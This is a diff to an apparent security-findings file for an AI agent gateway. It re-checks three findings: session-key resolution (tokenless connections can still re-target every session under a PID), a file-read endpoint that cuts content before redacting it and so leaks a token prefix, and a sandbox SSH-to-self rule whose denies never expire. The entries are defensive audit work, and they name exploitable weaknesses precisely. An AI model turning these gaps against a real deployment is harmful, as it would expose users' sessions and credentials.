 - **Verified claim:** Largely superseded at HEAD, with a narrow residual. _resolve_session_key_strict now prefers (0) the gateway-injected per-call caller context and (1) a signed per-SESSION token. The token is minted unconditionally for every session on a shared AcpRuntime (acp/runtime.py:6822) and resolved through a MAC-signed mapping, above the env var. (3) the host-pid sidecar refuses a pid hosting several sessions. In gatewayd, a token-carrying stub resolves to its own token's session and fails closed on an unclaimed or mismatched token ('every process-tree source left answers per RUNTIME'). The process-tree walk (peer_resolve.resolve_peer_identity) returns '' for a multi-session pid. What still answers per process: a TOKENLESS stub connection. A claim with no token re-targets every connection under the PID, and a token-carrying claim also re-targets tokenless connections (daemon/control.py:167-173; claim.py:118-121; session_provider.py:915-919 'Empty ... falls back to the PID-wide re-target'). Per the code comments this covers older sessions, stubs that predate the token, and runtimes where the gateway injected no stubs. Whether any default-install connection is still tokenless on a multi-session runtime cannot be checked here.
 - **Evidence (at `397f4be`):**
@@ -1023,6 +1067,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** verify_needed:G37(#17075)
 
 ### SEC-14 [15, default, effort S] Cap-straddle token leak is in api_file_read (cuts, then redacts); office_preview is fixed — PARTLY
+
+> **COMPLETED** — covered by open upstream PR #17298 ("redact file-read content before cutting it to the cap"; diff verified: over-read by `_STREAM_HOLDBACK_JWT_MAX`, redact-then-agree, then cut); not duplicated.
 - **Original claim:** office_preview cap-straddle serves part of a credential unmasked (corrected below)
 - **Verified claim:** Mis-scoped. At HEAD the office preview does NOT have the cap-straddle. The module redacts before capping ('redacted before they are capped'). doc_parser stops only after the whole paragraph or slide that reaches max_chars, and doc_blocks' budget is whole-or-nothing. A real .docx with a ghp_ token paragraph straddling _OFFICE_PREVIEW_CAP served '[REDACTED: cr...' and no fragment. The straddle IS present in the other endpoint. api_file_read reads read_cap+1 bytes, does `content = content[:read_cap]` FIRST, and then redacts. A ghp_ token cut at the cap serves its first 20 characters unmasked ('ghp_A1b2C3d4E5f6G7h8I9j'), while a key=value anchored secret is still redacted because its anchor survives the cut. The claim's premise that #17298 fixed api_file_read does not hold in this checkout. #17298 may be unmerged; this checkout is a 1-commit shallow clone, so history cannot be checked.
 - **Evidence (at `397f4be`):**
@@ -1082,6 +1128,8 @@ Part of the validated findings set; start at [00-index.md](00-index.md). Code ve
 - **Sources:** FIX_PLAN:REL-8, REVIEW_FINDINGS:Part1#12
 
 ### SEC-17 [15, armed, effort M] sandbox-escape-ssh-self: denies are permanent; own-address set only grows until restart — PARTLY
+
+> **COMPLETED** — fixed on `main` in `9c892db` (`fix/ssh-self-own-set-generation`): each refresh pass rebuilds the live own set (seed + netlink + DNS) with a short-grace departed ledger so the set shrinks again; own-address DENY verdicts are generation-tagged and revalidated once when the generation moves (served stale while a single worker re-resolves); loopback/unspecified denies stay permanent. security.md updated in-commit.
 - **Original claim:** sandbox-escape-ssh-self stale decision cache (corrected below)
 - **Verified claim:** A lifetime-sticky refusal mechanism exists in the sandbox-escape-ssh-self rule's host classifier, so a remote host allowed early can be refused for the rest of a long-running gateway's life. (a) DENY verdicts in _HOST_VERDICT_CACHE are permanent by design ('DENY verdicts stay permanent: over-blocking is this floor's safe direction'); only ALLOW verdicts expire (_HOST_VERDICT_ALLOW_TTL = 300 s). (b) The own-host name/address set is only ever UNIONED, at startup, on netlink publication and on each 300 s refresh, and never shrinks. Once the gateway host has held an address (an old DHCP lease, a VPN or container interface) or resolved a name to one, any remote host that later resolves to that address is classified 'self' and denied until restart. After the 300 s ALLOW TTL lapses, the revalidation that hits such an address flips the host to a permanent deny. That matches 'allowed, then refused 4x on a 41 h gateway', but the reporter's actual trigger depends on that host's DNS and interface history and cannot be reproduced here.
 - **Evidence (at `397f4be`):**
